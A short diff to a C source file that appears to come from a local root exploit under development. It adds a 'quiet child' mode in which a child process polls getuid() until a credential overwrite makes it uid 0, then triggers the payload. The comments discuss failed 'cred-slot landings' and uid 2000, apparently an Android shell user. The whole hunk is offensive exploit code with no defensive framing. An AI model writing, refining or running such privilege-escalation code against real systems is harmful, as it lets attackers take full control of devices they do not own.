@@ -1718,6 +1718,20 @@ static void child_spin_until_cmd(int cmd_r, char *cmd) {
   struct pollfd pfd;
   pfd.fd = cmd_r;
   pfd.events = POLLIN;
+  /* QUIET CHILD (09-13): every cred-slot landing so far wedged/killed
+   * the punched child MID-SYSCALL (pwrite(O_SYNC) beacon, poll reads,
+   * perf context). Z33's living child had none of those. Quiet mode =
+   * getuid + nanosleep ONLY — both cred-inert — so a landing at any
+   * instant is survivable, and getuid()==0 self-triggers the payload. */
+  if (env_flag("UID0_QUIET_CHILD", 0)) {
+    for (;;) {
+      if ((uint32_t)getuid() == 0 || child_seen_root() || child_go_file()) {
+        *cmd = 'G';
+        return;
+      }
+      usleep(100000);
+    }
+  }
   for (;;) {
     /* Z33: /proc/status Uid 0 while getuid() stayed 2000; pipe C never
      * answered. Auto-G on status/euid or a go-file so payload does not
